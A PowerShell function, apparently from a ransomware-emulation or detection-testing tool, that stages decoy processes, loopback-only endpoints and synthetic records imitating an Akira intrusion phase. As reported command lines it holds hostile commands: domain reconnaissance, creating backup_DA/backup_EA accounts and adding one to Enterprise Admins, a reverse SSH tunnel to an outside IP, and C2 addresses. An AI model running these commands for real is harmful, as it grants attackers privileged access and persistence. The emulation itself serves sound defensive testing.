function Invoke-AkiraFlashAdaptixDiscoveryPersistence {
    param([Parameter(Mandatory)][System.Collections.IDictionary]$Paths)
    $time = Get-AkiraFlashTimeline
    $cmd = Join-Path $env:SystemRoot 'System32\cmd.exe'

    $adaptix = Join-Path $Paths.Payloads 'AdgNsy.exe'
    New-AkiraFlashBinaryDecoy -Path $adaptix -Role 'AdaptixC2 beacon process-name canary'
    Invoke-AkiraFlashDecoyProcess -FilePath $adaptix -ReportedCommandLine 'AdgNsy.exe --profile AdaptixC2 --server 172.96.137.160:443 (loopback-routed canary)'
    Invoke-AkiraFlashLoopbackEndpoint -HostName '172.96.137.160' -Port 443 -Path '/beacon'

    foreach ($command in @(
        'systeminfo',
        'nltest /dclist:',
        'nltest /domain_trusts',
        'whoami /groups',
        'net group "domain admins" /dom',
        'net group "enterprise admins" /dom'
    )) {
        Invoke-AkiraFlashDecoyProcess -FilePath $cmd -ReportedCommandLine $command
    }

    $directoryCanary = [ordered]@{
        disclaimer = 'Synthetic records only; no domain account or group is created.'
        accounts = @(
            [ordered]@{ samAccountName = 'backup_DA'; password = 'LAB-CANARY-NOT-A-CREDENTIAL'; groups = @('Domain Users') },
            [ordered]@{ samAccountName = 'backup_EA'; password = 'LAB-CANARY-NOT-A-CREDENTIAL'; groups = @('Enterprise Administrators') }
        )
    }
    Write-AkiraFlashEvidenceFile -Path (Join-Path $Paths.SyntheticAD 'backup-accounts.json') -Content ($directoryCanary | ConvertTo-Json -Depth 6) -Purpose 'backup_DA and backup_EA account/group canaries' -Timestamp $time.Adaptix.AddMinutes(9)
    foreach ($command in @(
        'net user backup_DA LAB-CANARY-PASSWORD /add /dom',
        'net user backup_EA LAB-CANARY-PASSWORD /add /dom',
        'net group "enterprise admins" backup_EA /add /dom'
    )) {
        Invoke-AkiraFlashDecoyProcess -FilePath $cmd -ReportedCommandLine $command
    }

    $mstsc = Join-Path $Paths.Tools 'mstsc.exe'
    New-AkiraFlashBinaryDecoy -Path $mstsc -Role 'RDP lateral-movement process-name canary'
    Invoke-AkiraFlashDecoyProcess -FilePath $mstsc -ReportedCommandLine 'mstsc.exe /v:ROOT-DC01 /admin (actual network target 127.0.0.1 only)'
    Invoke-AkiraFlashLoopbackPort -Port 3389 -ReportedTarget 'ROOT-DC01 using backup_EA'

    $rustDesk = Join-Path $Paths.Payloads 'RustDesk\rustdesk.exe'
    New-AkiraFlashBinaryDecoy -Path $rustDesk -Role 'RustDesk remote-access process-name canary'
    Invoke-AkiraFlashDecoyProcess -FilePath $rustDesk -ReportedCommandLine 'rustdesk.exe --install-service --password LAB-CANARY-NOT-A-CREDENTIAL'
    $rustDeskService = [ordered]@{
        name = 'RustDesk'
        imagePath = 'C:\Program Files\RustDesk\rustdesk.exe --service'
        startType = 'Automatic'
        state = 'Synthetic - service not installed'
        remoteAccessEnabled = $false
    }
    Write-AkiraFlashEvidenceFile -Path (Join-Path $Paths.Payloads 'RustDesk\service-canary.json') -Content ($rustDeskService | ConvertTo-Json -Depth 4) -Purpose 'RustDesk persistence record without service installation' -Timestamp $time.Adaptix.AddMinutes(18)

    $ssh = Join-Path $Paths.Tools 'ssh.exe'
    New-AkiraFlashBinaryDecoy -Path $ssh -Role 'SSH reverse-tunnel process-name canary'
    Invoke-AkiraFlashDecoyProcess -FilePath $ssh -ReportedCommandLine 'ssh root@193.242.184.150 -R *:10400 -p22 (actual connection 127.0.0.1 only)'
    Invoke-AkiraFlashLoopbackPort -Port 22 -ReportedTarget '193.242.184.150 reverse SSH tunnel host'

    $netScan = Join-Path $Paths.Tools 'n.exe'
    New-AkiraFlashBinaryDecoy -Path $netScan -Role 'renamed SoftPerfect Network Scanner process-name canary'
    Invoke-AkiraFlashDecoyProcess -FilePath $netScan -ReportedCommandLine 'n.exe /range ROOT-DOMAIN-CANARY (actual scan scope 127.0.0.1 only)'
    foreach ($port in @(135, 445, 3389, 5432)) { Invoke-AkiraFlashLoopbackPort -Port $port -ReportedTarget 'synthetic enterprise subnet' }
    $scanResults = @'
<?xml version="1.0"?>
<netscan-results actual-scope="127.0.0.1">
  <host name="ROOT-DC01" address="10.88.0.10" role="metadata-only" />
  <host name="VEEAM01" address="10.88.0.20" role="metadata-only" />
  <host name="FILE01" address="10.88.0.30" role="metadata-only" />
</netscan-results>
'@
    Write-AkiraFlashEvidenceFile -Path (Join-Path $Paths.Staging 'shares.txt') -Content $scanResults -Purpose 'NetScan/share discovery output canary' -Timestamp $time.Adaptix.AddMinutes(28)

    Add-AkiraFlashTimelineEvent -Timestamp $time.Adaptix -Phase 'Command and Control' -Event 'AdaptixC2 AdgNsy.exe appeared approximately five hours after initial execution.' -Details @{ reportedC2 = '172.96.137.160:443'; actualDestination = '127.0.0.1'; liveBeacon = $false }
    Add-AkiraFlashTimelineEvent -Timestamp $time.Adaptix.AddMinutes(8) -Phase 'Discovery and Persistence' -Event 'Rapid domain discovery followed by backup_DA/backup_EA account and Enterprise Administrators membership canaries.' -Details @{ domainModified = $false; realCredentials = $false }
    Add-AkiraFlashTimelineEvent -Timestamp $time.Adaptix.AddMinutes(18) -Phase 'Persistence' -Event 'RustDesk service and reverse SSH tunnel represented without installing remote access or contacting the tunnel host.' -Details @{ serviceInstalled = $false; actualNetwork = '127.0.0.1 only' }
}
